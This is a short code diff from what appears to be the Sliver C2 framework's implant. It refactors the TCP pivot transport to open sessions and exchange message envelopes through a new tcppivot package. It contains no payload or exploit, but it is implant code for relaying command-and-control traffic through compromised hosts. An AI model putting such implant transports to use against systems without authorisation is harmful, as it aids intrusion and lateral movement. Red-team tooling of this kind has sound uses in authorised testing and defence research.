@@ -55,6 +55,9 @@ import (
 
 	// {{if .Config.TCPPivotc2Enabled}}
 	"fmt"
+
+	"github.com/bishopfox/sliver/implant/sliver/transports/tcppivot"
+
 	// {{end}}
 
 	"io"
@@ -624,10 +627,13 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Attempting to connect via TCP Pivot to: %s\n", addr)
 	// {{end}}
-	conn, err := net.Dial("tcp", addr)
+
+	opts := tcppivot.ParseTCPPivotOptions(uri)
+	pivot, err := tcppivot.TCPPivotStartSession(uri.Host, uri.Port(), opts)
 	if err != nil {
 		return nil, err
 	}
+
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
 	ctrl := make(chan bool, 1)
@@ -655,14 +661,14 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
 			// {{end}}
-			tcpPivotWriteEnvelope(&conn, envelope)
+			pivot.WriteEnvelope(envelope)
 		}
 	}()
 
 	go func() {
 		defer connection.Cleanup()
 		for {
-			envelope, err := tcpPivotReadEnvelope(&conn)
+			envelope, err := pivot.ReadEnvelope()
 			if err == io.EOF {
 				break
 			}
